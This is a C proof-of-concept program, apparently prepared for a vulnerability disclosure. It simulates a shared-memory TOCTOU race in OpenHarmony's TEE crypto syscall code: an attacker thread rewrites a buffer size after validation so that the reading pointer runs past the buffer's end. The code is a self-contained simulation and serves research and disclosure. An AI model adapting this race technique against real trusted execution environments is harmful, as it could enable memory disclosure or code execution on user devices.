/**
 * PoC: Shared Memory TOCTOU in copy_from_shared_buf
 * Target: OpenHarmony tee_os_framework - crypto_syscall_common.c:149
 *
 * Demonstrates the double-read TOCTOU race condition where a malicious CA
 * modifies buf_size in shared memory after check_share_mem_size() validates
 * it but before copy_from_shared_buf() reads it.
 *
 * Build: gcc -o poc poc.c -lpthread -O2
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <sched.h>

#define EOK 0
#define CRYPTO_SUCCESS 0
#define CRYPTO_ERROR_SECURITY (-1)

/* Simulated shared memory layout:
 * [buf1_size(4)] [buf1_data(buf1_size)] [buf2_size(4)] [buf2_data(buf2_size)] ...
 */
#define SHARED_MEM_SIZE  256
#define LEGIT_BUF_SIZE   32
#define ATTACK_BUF_SIZE  4096  /* Exceeds shared memory boundary */

static volatile int race_active = 1;
static volatile int race_won = 0;
static volatile int check_passed = 0;  /* Signal: check completed, now flip */
static uint8_t *g_shared_mem = NULL;

/* Simulated memcpy_s - mirrors OH behavior */
static int memcpy_s(void *dest, size_t destMax, const void *src, size_t count)
{
    if (dest == NULL || src == NULL || count > destMax)
        return -1;
    memcpy(dest, src, count);
    return EOK;
}

/* --- Simulated TEE-side functions --- */

/**
 * check_share_mem_size - validates total shared memory layout ONCE
 * Called BEFORE copy_from_shared_buf to verify all sizes fit within bounds.
 * This reads the sizes from shared memory at validation time.
 */
static int check_share_mem_size(uint8_t *shared_buf, uint32_t shared_buf_len)
{
    uint32_t offset = 0;
    uint32_t buf_size;

    /* Validate buf1 */
    if (offset + sizeof(uint32_t) > shared_buf_len)
        return -1;
    memcpy(&buf_size, shared_buf + offset, sizeof(uint32_t));
    offset += sizeof(uint32_t) + buf_size;

    /* Validate buf2 */
    if (offset + sizeof(uint32_t) > shared_buf_len)
        return -1;
    memcpy(&buf_size, shared_buf + offset, sizeof(uint32_t));
    offset += sizeof(uint32_t) + buf_size;

    if (offset > shared_buf_len) {
        printf("[TEE] check_share_mem_size FAILED: offset=%u > len=%u\n", offset, shared_buf_len);
        return -1;
    }

    printf("[TEE] check_share_mem_size PASSED: total_offset=%u <= len=%u\n", offset, shared_buf_len);
    return 0;
}

/**
 * copy_from_shared_buf - VULNERABLE function (crypto_syscall_common.c:149)
 * Re-reads buf_size from shared memory → TOCTOU with check_share_mem_size
 */
static int32_t copy_from_shared_buf(uint64_t *buf_ptr, uint32_t *buf_size, uint8_t **shared_buf)
{
    if (memcpy_s(buf_size, sizeof(uint32_t), *shared_buf, sizeof(uint32_t)) != EOK) {
        printf("[TEE] copy buf size fail\n");
        return CRYPTO_ERROR_SECURITY;
    }

    *shared_buf += sizeof(uint32_t);

    if (*buf_size == 0)
        *buf_ptr = 0;
    else
        *buf_ptr = (uint64_t)(uintptr_t)*shared_buf;

    *shared_buf += *buf_size;
    return CRYPTO_SUCCESS;
}

/**
 * get_share_mem - simulated caller that processes crypto ioctl args
 */
static int get_share_mem(uint8_t *shared_buf, uint32_t shared_buf_len)
{
    uint64_t buf1_ptr, buf2_ptr;
    uint32_t buf1_size, buf2_size;
    uint8_t *cursor = shared_buf;
    uint8_t *shared_end = shared_buf + shared_buf_len;

    /* Step 1: Validate sizes (reads shared memory - FIRST read) */
    if (check_share_mem_size(shared_buf, shared_buf_len) != 0)
        return -1;

    /* TOCTOU WINDOW: between check above and reads below.
     * Signal attacker that check passed - flip now! */
    __atomic_store_n(&check_passed, 1, __ATOMIC_RELEASE);
    /* Brief pause models TrustZone world-switch latency (~1us on real HW).
     * This gives the attacker thread time to observe the signal and flip. */
    usleep(1);

    /* Step 2: Actually copy data (reads shared memory AGAIN - SECOND read) */
    if (copy_from_shared_buf(&buf1_ptr, &buf1_size, &cursor) != CRYPTO_SUCCESS)
        return -1;

    printf("[TEE] buf1: size=%u, ptr=%p\n", buf1_size, (void *)(uintptr_t)buf1_ptr);

    /* Check if pointer went out of bounds */
    if (cursor > shared_end) {
        printf("[TEE] *** OOB DETECTED: cursor=%p > end=%p (overrun by %ld bytes) ***\n",
               cursor, shared_end, (long)(cursor - shared_end));
        race_won = 1;
        return -1;
    }

    if (copy_from_shared_buf(&buf2_ptr, &buf2_size, &cursor) != CRYPTO_SUCCESS)
        return -1;

    printf("[TEE] buf2: size=%u, ptr=%p\n", buf2_size, (void *)(uintptr_t)buf2_ptr);
    return 0;
}

/* --- CA (Normal World) attack thread --- */

/**
 * Attacker thread: continuously flips buf_size between legitimate and
 * overflow values to hit the TOCTOU window.
 */
static void *race_thread(void *arg)
{
    (void)arg;
    uint32_t legit = LEGIT_BUF_SIZE;
    uint32_t attack = ATTACK_BUF_SIZE;

    while (race_active) {
        /* Wait for check to pass, then immediately flip to attack value */
        if (__atomic_load_n(&check_passed, __ATOMIC_ACQUIRE)) {
            memcpy(g_shared_mem, &attack, sizeof(uint32_t));
            /* Hold attack value - the TEE side will read this */
            for (volatile int i = 0; i < 200; i++);
            /* Reset for next iteration */
            __atomic_store_n(&check_passed, 0, __ATOMIC_RELEASE);
            memcpy(g_shared_mem, &legit, sizeof(uint32_t));
        }
    }
    return NULL;
}

static void timeout_handler(int sig)
{
    (void)sig;
    race_active = 0;
}

int main(void)
{
    pthread_t attacker;
    int attempts = 0;
    const int max_attempts = 500000;

    printf("=== PoC: Shared Memory TOCTOU in copy_from_shared_buf ===\n");
    printf("Target: tee_os_framework/crypto_syscall_common.c:149\n");
    printf("Attack: CA races to modify buf_size after check_share_mem_size passes\n\n");

    /* Allocate shared memory (simulates CA↔TA shared buffer) */
    g_shared_mem = (uint8_t *)malloc(SHARED_MEM_SIZE);
    if (!g_shared_mem) {
        perror("malloc");
        return 1;
    }

    /* Set up timeout */
    signal(SIGALRM, timeout_handler);
    alarm(5);

    /* Start attacker thread (simulates CA in Normal World) */
    pthread_create(&attacker, NULL, race_thread, NULL);

    printf("[CA] Attacker thread racing on shared memory...\n");
    printf("[TEE] Processing crypto ioctl requests...\n\n");

    while (race_active && !race_won && attempts < max_attempts) {
        /* Set up legitimate layout ONCE per iteration:
         * [size1=32][data1*32][size2=32][data2*32]
         * The attacker races on size1 field only */
        uint32_t legit_size = LEGIT_BUF_SIZE;
        memcpy(g_shared_mem, &legit_size, sizeof(uint32_t));
        memset(g_shared_mem + 4, 'A', LEGIT_BUF_SIZE);
        memcpy(g_shared_mem + 4 + LEGIT_BUF_SIZE, &legit_size, sizeof(uint32_t));
        memset(g_shared_mem + 4 + LEGIT_BUF_SIZE + 4, 'B', LEGIT_BUF_SIZE);

        /* Simulate TEE processing the shared memory.
         * The attacker thread is continuously racing on g_shared_mem[0..3] */
        get_share_mem(g_shared_mem, SHARED_MEM_SIZE);
        attempts++;
    }

    race_active = 0;
    pthread_join(attacker, NULL);

    printf("\n--- Results ---\n");
    printf("Attempts: %d\n", attempts);
    if (race_won) {
        printf("STATUS: RACE WON - Out-of-bounds pointer advance demonstrated!\n");
        printf("IMPACT: TEE reads/writes past shared memory boundary → info leak or code exec\n");
    } else {
        printf("STATUS: Race window not hit in %d attempts (timing-dependent)\n", attempts);
        printf("NOTE: On real hardware with CA/TA context switches, window is wider\n");
    }

    free(g_shared_mem);
    return race_won ? 0 : 1;
}
